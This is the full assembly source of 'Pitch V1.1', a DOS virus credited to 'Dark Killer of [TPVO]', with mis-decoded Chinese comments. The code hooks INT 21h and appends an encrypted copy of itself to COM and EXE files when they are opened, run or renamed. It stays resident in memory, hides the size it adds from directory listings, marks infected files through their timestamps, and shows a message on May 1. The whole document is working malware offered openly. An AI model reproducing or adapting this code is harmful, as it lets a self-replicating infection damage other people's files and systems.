

        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel
        v                                                              v
        e       »OÆW«Â¤O¯f¬r¬ã¨s²ÕÂ´ ²Ä ‘D ´Á Âø»x      P.007          e
        l       [¯f¬r]                                                 l
        O                                                              O
        v       Pitch 1.1                               Dark Killer    v
        e       E-Mail: None                                           e
        l                                                              l
        OvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvelOvel

        («¢! «¢! §Ú¦b¼g³o°¦¬r®ÉÁÙ¬O TPVO... ©Ò¥H...)

;
; =============================================================================
;   ¯f¬r¦WºÙ¡GPitch
;   ¯f¬rª©¥»¡GV1.1
;   ¯f¬r§@ªÌ¡G§Ú?! §Ú¬O½Ö?! ¬Ý msg §a!!
;   ·P¬V±ø¥ó¡GCOM¡BEXE ÀÉ
;   ¨ä¥¦    ¡G1.·|°l Int 21h ­ì©l¶i¤JÂI («D±`«D±`°½Ãiªº¤èªk...)
;             2.¤Ï°lÁa¥\¯à...
;             3.ÁôÂÃÀÉ®×¤j¤p... (ah=11h/12h/4eh/4fh)
;             4.¼g¤JÀÉ®×®É I/O Âà¦V...
;             5.½s½X...
; =============================================================================
;
                .286c
code            segment
                assume  cs:code,ds:code,es:code,ss:code
                org     0000h
start:
                mov     cx,enc_size             ; ­n¸Ñ½Xªºªø«×...
                db      0beh                    ; mov si,????
enc_start_val   dw      offset enc_start+0100h
enc_loop:
                db      2eh,80h,34h             ; xor byte ptr cs:[si],??
enc_val_number  db      00h
                inc     si                      ; »¼¼W«ü¥O...
                loop    enc_loop                ; °j°é...
enc_start:
                cli
                mov     ax,3306h
                xor     bx,bx
                int     21h                     ; ­Y¬O¦b¼ÒÀÀ®É, bx ¤£·|§ïÅÜ, ¦ý
delta:                                          ; ­Y¦b DOS 5.0 ¤U®É, bx ·|¶Ç¦^
                cmp     bl,05h                  ; DOS ª©¥»...
                jae     antitrace_ok
antitrace:
                mov     ah,4ch                  ; ¦b¼ÒÀÀÀô¹Ò¤º, Â÷¶}...
                int     21h
antitrace_ok:
                mov     bp,sp                   ; ­«©w¦ì...
                mov     si,[bp-06h]
                sub     si,offset delta

                mov     ah,04h                  ; ¨ú²{¦b¤é´Á...
                int     1ah
                cmp     dx,0501h                ; ­Y¬O 5/1 «hµo§@...
                jne     con1

                mov     ah,09h                  ; µo§@ (Åã¥Ü°T®§)...
                lea     dx,[si+offset msg]      ; ¨Ã¼g¤£°õ¦æ­ìÀÉ®×...
                int     21h
                mov     ax,4c00h
                int     21h
con1:
                mov     ax,4bffh                ; §PÂ_°O¾ÐÅé¤¤¬O§_¦³¬r...
                mov     bx,1996h
                int     21h
                cmp     ax,0331h
                jne     install
run_original:
                cmp     byte ptr cs:[si+offset filemode],00h
                jne     run_exe                 ; §PÂ_ÀÉ®×¼Ò¦¡, ¥H«ì´_ÀÉ®×...
run_com:
                cld
                push    ss
                pop     es
                add     si,offset head_1
                mov     di,0100h
                push    ss
                push    di
                movsw
                movsb
                push    ss
                pop     ds
                retf
run_exe:
                mov     ah,51h                  ; ¨ú­ìµ{¦¡ªº PSP...
                int     21h                     ; BX=­ì PSP ªº¸`¦ì¸m...

                push    cs
                pop     ds

                mov     ax,word ptr [si+offset exehead_1+0014h]
                mov     word ptr [si+offset j_origin_ip],ax
                mov     ax,word ptr [si+offset exehead_1+0016h]
                add     ax,bx
                add     ax,0010h
                mov     word ptr [si+offset j_origin_cs],ax

                mov     ax,word ptr [si+offset exehead_1+000eh]
                add     ax,bx
                add     ax,0010h
                mov     ss,ax
                mov     sp,word ptr [si+offset exehead_1+0010h]

                mov     ds,bx
                mov     es,bx

                int     03h                     ; CPU ¾n¦Cªº°ÝÃD... (486 ¥H¤U¾÷
                                                ; ¾¹³£·|²£¥Í³oºØ°ÝÃD) ©Ò¥H­n¥ý
                                                ; ©I¥s Int 03h Åý CPU ¾n¦C°Ï¦^
                                                ; ¼g, ¤]´N¬OÅý j_origin_ip ¤Î
                                                ; j_origin_cs ªº­È¼g¦^¥h...
                db      0eah
j_origin_ip     dw      0000h
j_origin_cs     dw      0000h

install:
                mov     ax,524dh                ; ºâ³Ì«á¤@¬q MCB ªº­È...
                int     21h
                mov     bx,word ptr es:[bx-02h]
                xor     di,di                   ; ¬Ùµ{¦¡½X¥Îªº...
mcb_loop1:
                mov     es,bx
                add     bx,word ptr es:[di+03h]
                inc     bx
                cmp     byte ptr es:[di],al
                je      mcb_loop1

                push    es
                mov     es,bx
                cmp     byte ptr es:[di],al
                pop     es
                jne     mcb_ok
mcb_loop2:
                mov     es,bx
                add     bx,word ptr es:[di+03h]
                inc     bx
                cmp     byte ptr es:[di],al
                je      mcb_loop2
mcb_ok:
                sub     word ptr es:[di+03h],vir_para
                                                ; ´îªÎ...
                mov     ax,es
                add     ax,word ptr es:[di+03h]
                inc     ax
                mov     es,ax

                push    cs
                pop     ds

                push    es
                push    offset con

                cld
                mov     cx,vir_size
                rep     movsb                   ; §â¯f¬r·h¹L¥h...
                retf
con:
                xor     si,si
                mov     ds,si

                cli
                mov     ax,offset newint21h     ; §ï int 21h , ´«¤W§Ú­Ìªº...
                xchg    word ptr [si+180h],ax
                mov     word ptr cs:entint21h,ax
                mov     word ptr cs:oldint21h,ax
                mov     ax,cs
                xchg    word ptr [si+182h],ax
                mov     word ptr cs:entint21h+0002h,ax
                mov     word ptr cs:oldint21h+0002h,ax

                push    cs
                pop     ds

                call    trace_int21h            ; °l int 21h ªºµ{¦¡¬q...

                jmp     run_original            ; ¸õ¦^­ìÀÉ®×¥h run...

callint21h      proc    near                    ; ©I¥s int 21h ¶i¤JÂI¥Îªº...
                pushf
                call    dword ptr cs:entint21h
                ret
callint21h      endp

check_me        proc    near
                and     al,00011111b
                cmp     al,00011110b
                ret
check_me        endp

check_name      proc    near                    ; §PÂ_¬O§_¬°¤£·P¬V¦W³æ...
                pushf
                pusha
                push    ds

                push    cs
                pop     ds

                cld

                add     di,001fh
                push    di
check_name_loop2:
                xor     ch,ch
                lodsb
                or      al,al
                je      check_name_ok
                mov     cl,al
                pop     di
                push    di
check_name_loop1:
                lodsb
                inc     di
                dec     cx
                cmp     byte ptr es:[di],al
                jne     check_name_con1
                jcxz    check_name_err
                jmp     short check_name_loop1
check_name_con1:
                add     si,cx
                jmp     short check_name_loop2
check_name_ok:
                pop     di
                pop     ds
                popa
                popf
                clc
                ret
check_name_err:
                pop     di
                pop     ds
                popa
                popf
                stc
                ret
check_name      endp

dirstealth      proc    near                    ; ÁôÂÃªº°Æµ{¦¡...
                call    callint21h
                pushf
                cmp     al,0ffh
                jne     dirstealth_con1
dirstealth_exit:
                popf
                ret
dirstealth_con1:
                pusha
                push    es

                mov     ah,2fh                  ; ¨ú DTA ªº¦ì¸m...
                call    callint21h              ; OldDTA = ES:BX
                cmp     byte ptr es:[bx],0ffh
                jne     dirstealth_con2
                add     bx,0007h
dirstealth_con2:
                mov     al,byte ptr es:[bx+17h]
                call    check_me
                jne     dirstealth_exit1

                sub     word ptr es:[bx+1dh],vir_size
                sbb     word ptr es:[bx+1fh],0000h
                and     byte ptr es:[bx+16h],11100000b
dirstealth_exit1:
                pop     es
                popa
                popf
                ret
dirstealth      endp

encryation      proc    near                    ; ½s½Xªº°Æµ{¦¡...
                pushf
                pusha
                push    es

                push    cs
                pop     es

                cld
                mov     cx,vir_size
                xor     si,si
                mov     di,offset vir_end
                rep     movsb

                mov     si,offset vir_end
                mov     bx,offset enc_start
                add     bx,ax
                mov     word ptr [si+offset enc_start_val],bx

                in      al,40h
                mov     byte ptr [si+offset enc_val_number],al

                mov     cx,enc_size
                lea     di,[si+offset enc_start]
encryation_loop1:
                xor     [di],al
                inc     di
                loop    encryation_loop1

                pop     es
                popa
                popf
                ret
encryation      endp

findstealth     proc    near
                call    callint21h
                jc      findstealth_exit0

                pushf
                pusha
                push    es

                mov     ah,2fh
                call    callint21h
                mov     al,byte ptr es:[bx+16h]
                call    check_me
                jne     findstealth_exit1

                sub     word ptr es:[bx+1ah],vir_size
                sbb     word ptr es:[bx+1ch],0000h
                and     byte ptr es:[bx+16h],11100000b
findstealth_exit1:
                pop     es
                popa
                popf
findstealth_exit0:
                ret
findstealth     endp

get_sft         proc    near                    ; ¨ú sft ªº°Æµ{¦¡...
                push    bx
                mov     ax,1220h
                int     2fh
                mov     ax,1216h
                xor     bh,bh
                mov     bl,byte ptr es:[di]
                int     2fh
                pop     bx
                ret
get_sft         endp

infect_com      proc    near                    ; ·P¬V com ªº°Æµ{¦¡...
                pushf
                pusha
                push    ds

                push    cs
                pop     ds

                mov     byte ptr filemode,00h   ; ³]©w¬° COM ÀÉ...

                mov     ah,3fh                  ; Åª¨úÀÉÀY...
                mov     cx,0003h
                mov     dx,offset head_1
                call    callint21h

                mov     al,02h                  ; ¨úÀÉ®×¤j¤p¤]¶¶«K²¾¨ìÀÉ§À...
                call    seek
                sub     ax,0003h                ; ­pºâ¸õÅD­È...
                mov     byte ptr head_2,0e9h
                mov     word ptr head_2+0001h,ax

                add     ax,0103h
                call    encryation              ; ½s½X...

                mov     cx,vir_size             ; ¼g¤J¯f¬r¥DÅé...
                mov     dx,offset vir_end
                call    write

                xor     al,al                   ; ²¾¨ìÀÉÀY...
                call    seek

                mov     cx,0003h                ; ¼g¤J jmp ³¡¥÷...
                mov     dx,offset head_2
                call    write

                pop     ds
                popa
                popf
                clc                             ; ¼g¤J ok... C ºX¼Ðµ¥©ó 0
                ret
infect_com      endp

infect_exe      proc    near                    ; ·P¬V EXE ªº°Æµ{¦¡...
                pushf
                pusha
                push    ds
                push    es

                push    cs
                pop     ds
                push    cs
                pop     es

                mov     byte ptr filemode,01h   ; ³]©w¬° EXE ÀÉ

                mov     ah,3fh                  ; Åª¨úÀÉÀY...
                mov     cx,0018h
                mov     dx,offset exehead_1
                call    callint21h

                cld                             ; copy ²Ä¤G­ÓÀÉÀY¥H«K­×§ï...
                mov     cx,0018h
                mov     si,offset exehead_1
                mov     di,offset exehead_2
                rep     movsb

                cmp     word ptr exehead_1,'ZM' ; ­Y°ÆÀÉ¦W¬° EXE ¦ý¤£¬O EXE ®æ
                jne     infect_exe_error        ; ¦¡ªº«h¤£·P¬V...

                mov     al,02h                  ; ¨úÀÉ®×¤j¤p...
                call    seek
                add     ax,vir_size             ; ¥[¤W¦Û¤vªº¤j¤p
                adc     dx,0000h                ; ¥i¯à·|¦³¶i¦ì, ©Ò¥H­n¥Î adc ¦A
                                                ; ¥[¨ì dx
                mov     cx,0200h
                div     cx                      ; ±NÀÉ®×¤j¤p°£¥H 200h (512)
                or      dx,dx                   ; ­Y¦³¾l¼Æ«h ax ¦A¥[ 1...
                je      infect_exe_con1
                inc     ax
infect_exe_con1:
                mov     word ptr exehead_2+0002h,dx
                mov     word ptr exehead_2+0004h,ax

                mov     al,02h
                call    seek
                mov     cx,0010h
                div     cx                      ; ºâ¥X·sªº cs:ip
                sub     ax,word ptr exehead_2+0008h
                mov     word ptr exehead_2+0014h,dx
                mov     word ptr exehead_2+0016h,ax

                push    dx

                add     dx,1000h                ; ºâ¥X·sªº ss:sp
                mov     word ptr exehead_2+000eh,ax
                mov     word ptr exehead_2+0010h,dx

                pop     ax
                call    encryation

                mov     cx,vir_size             ; ¼g¤J¯f¬r¥DÅé...
                mov     dx,offset vir_end
                call    write

                xor     al,al                   ; ²¾¨ìÀÉÀY...
                call    seek

                mov     cx,0018h                ; ¼g¤JÀÉÀY¸ê®Æ...
                mov     dx,offset exehead_2
                call    write

                pop     es
                pop     ds
                popa
                popf
                clc                             ; ¼g¤J¦¨¥\, C=0
                ret
infect_exe_error:
                pop     es
                pop     ds
                popa
                popf
                stc                             ; ¤£¤©¥H·P¬V, C=1
                ret
infect_exe      endp

newint21h       proc    far
                pushf
                cmp     ax,4bffh                ; ¬O§_¬°¦P¦ñ¦b©I¥s...
                je      mark
                cmp     ah,11h                  ; ÁôÂÃ (dir)
                je      dir_stealth
                cmp     ah,12h                  ; ÁôÂÃ (dir)
                je      dir_stealth
                cmp     ah,3dh                  ; ·P¬V (¶}ÀÉ)
                je      infect
                cmp     ah,43h                  ; ·P¬V (¨ú±o©Î§ó§ïÀÉ®×ÄÝ©Ê)
                je      infect
                cmp     ah,4bh                  ; ·P¬V (°õ¦æÀÉ®×)
                je      infect
                cmp     ah,4eh                  ; ÁôÂÃ (find)
                je      find_stealth
                cmp     ah,4fh                  ; ÁôÂÃ (find)
                je      find_stealth
                cmp     ah,56h                  ; ·P¬V (§ïÀÉ¦W)
                je      infect
                cmp     ax,5700h                ; ÁôÂÃ (¨úÀÉ®×®É¶¡)
                je      timeg_stealth
                cmp     ax,5701h                ; «ì´_ (³]ÀÉ®×®É¶¡)
                je      times_stealth
newint21h_exit:
                popf
                jmp     dword ptr cs:oldint21h  ; ¸õ¦^­ì int21h
dir_stealth:
                popf
                call    dirstealth
                retf    0002h
find_stealth:
                popf
                call    findstealth
                retf    0002h
timeg_stealth:
                popf
                call    timegstealth
                retf    0002h
times_stealth:
                popf
                call    timesstealth
                retf    0002h
mark:
                cmp     bx,1996h
                jne     newint21h_exit
                mov     ax,0331h
                popf
                iret
infect:
                pusha
                push    ds
                push    es

                call    protect                 ; §â int 2ah §@±¼...

                mov     ax,4300h                ; ¨úÀÉ®×ÄÝ©Ê...
                call    callint21h
                push    cx                      ; «O¯dÀÉ®×ÄÝ©Ê...
                mov     ax,4301h
                xor     cx,cx                   ; ±NÀÉ®×ÄÝ©Ê§ï¬° 0...
                call    callint21h

                mov     ax,3d00h                ; ¶}ÀÉ... (µ¥¤U¥Î sft §ï¦¨Åª¼g
                call    callint21h              ; ¼Ò¦¡)
                jc      infect_exit1
                xchg    bx,ax

                call    get_sft                 ; ¨ú sft...

                mov     al,byte ptr es:[di+0dh]
                call    check_me                ; ­YÀÉ®×®É¶¡¬° 60sec , ¥Nªí·P¬V
                je      infect_exit2            ; ¹L¤F, ¤£¦A¦¸·P¬V...

                mov     word ptr es:[di+02h],0002h

                cmp     word ptr es:[di+28h],'OC'
                jne     infect_con1
                cmp     byte ptr es:[di+2ah],'M'
                jne     infect_exit2

                mov     si,offset uninfect_com  ; ¬O§_¬°¤£·P¬V¦W³æ?!
                call    check_name
                jc      infect_exit2

                call    infect_com
                jmp     short infect_exit2
infect_con1:
                cmp     word ptr es:[di+28h],'XE'
                jne     infect_exit2
                cmp     byte ptr es:[di+2ah],'E'
                jne     infect_exit2

                mov     si,offset uninfect_exe  ; ¬O§_¬°¤£·P¬V¦W³æ?!
                call    check_name
                jc      infect_exit2

                call    infect_exe
infect_exit2:
                jc      infect_con2

                mov     ax,5700h                ; ±NÀÉ®×®É¶¡§ï¬° 60sec...
                call    callint21h
                mov     ax,5701h
                and     cl,11111110b
                or      cl,00011110b
                call    callint21h
infect_con2:
                mov     ah,3eh                  ; ÃöÀÉ...
                call    callint21h
infect_exit1:
                mov     ax,4301h                ; «ì´_ÀÉ®×ÄÝ©Ê...
                pop     cx
                call    callint21h
infect_exit0:
                call    unprotect               ; «ì´_ int 2ah...

                pop     es
                pop     ds
                popa
                jmp     newint21h_exit
newint21h       endp

protect         proc    near
                pushf
                pusha
                push    ds

                xor     si,si
                mov     ds,si

                mov     di,word ptr [si+00a8h]  ; §@±¼ int 2ah...
                mov     word ptr cs:oldint2ah,di
                mov     ds,word ptr [si+00aah]
                mov     word ptr cs:oldint2ah+0002h,ds

                mov     al,0cfh
                xchg    byte ptr [di],al
                mov     byte ptr cs:oldint2ah_char,al

                pop     ds
                popa
                popf
                ret
protect         endp

seek            proc    near                    ; ²¾°ÊÀÉ®×«ü¼Ðªº°Æµ{¦¡...
                mov     ah,42h
                xor     cx,cx
                cwd
                call    callint21h
                ret
seek            endp

timegstealth    proc    near
                call    callint21h
                jc      timegstealth_exit0

                pushf
                push    ax
                push    di
                push    es
                call    get_sft

                mov     al,byte ptr es:[di+0dh]
                call    check_me
                jne     timegstealth_exit1

                and     cl,11100000b
timegstealth_exit1:
                pop     es
                pop     di
                pop     ax
                popf
timegstealth_exit0:
                ret
timegstealth    endp

timesstealth    proc    near
                call    callint21h
                jc      timesstealth_exit0
                pushf
                pusha
                push    es

                call    get_sft

                mov     al,byte ptr [di+0dh]
                call    check_me
                jne     timesstealth_exit1

                mov     ax,5701h
                and     cl,11111110b
                or      cl,00011110b
                call    callint21h
timesstealth_exit1:
                pop     es
                popa
                popf
timesstealth_exit0:
                ret
timesstealth    endp

trace_int21h    proc    near
                pushf
                pusha
                push    ds

                mov     ax,1203h
                int     2fh
                mov     si,109eh
                cmp     byte ptr [si],0fah
                je      trace_int21h_exit1
                cmp     word ptr [si],9090h
                jne     trace_int21h_exit0
trace_int21h_exit1:
                mov     word ptr cs:entint21h,si
                mov     word ptr cs:entint21h+0002h,ds
trace_int21h_exit0:
                pop     ds
                popa
                popf
                ret
trace_int21h    endp

unprotect       proc    near
                pushf
                pusha
                push    es

                cld
                mov     al,byte ptr cs:oldint2ah_char
                les     di,dword ptr cs:oldint2ah
                stosb

                pop     es
                popa
                popf
                ret
unprotect       endp

write           proc    near
                pushf
                pusha
                push    es

                mov     ax,1220h
                int     2fh
                push    word ptr es:[di]
                mov     ax,1220h
                xor     bx,bx
                int     2fh
                pop     ax
                mov     ah,al
                xchg    word ptr es:[di],ax

                push    ax
                mov     si,dx
write_loop1:
                lodsb
                cmp     al,0ffh
                xchg    dx,ax
                mov     ah,06h
                jne     write_con1
                mov     ah,02h
write_con1:
                call    callint21h
                loop    write_loop1

                pop     word ptr es:[di]

                pop     es
                popa
                popf
                ret
write           endp

msg             db      '[Pitch V1.1] by Dark Killer of [TPVO].',0dh,0ah
                db      '$'

entint21h       dd      00000000h               ; Int 21h ¶i¤JÂI¦ì¸m...
filemode        db      00h                     ; 0=COM ; 1=EXE
oldint21h       dd      00000000h
oldint2ah       dd      00000000h
oldint2ah_char  db      00h
uninfect_com    db      05h,'4DOS '             ; ¤£·P¬V¦W³æ...
                db      08h,'COMMAND '
                db      00h
uninfect_exe    db      03h,'WIN'
                db      07h,'EMM386 '
                db      00h
exehead_2:
head_2          db      18h dup(00h)
exehead_1:
head_1          db      0cdh,20h,00h
                db      15h dup(00h)
vir_end:

enc_size        equ     offset vir_end-offset enc_start
vir_size        equ     offset vir_end-offset start
vir_para        equ     (vir_size+07h)/08h

code            ends
                end     start
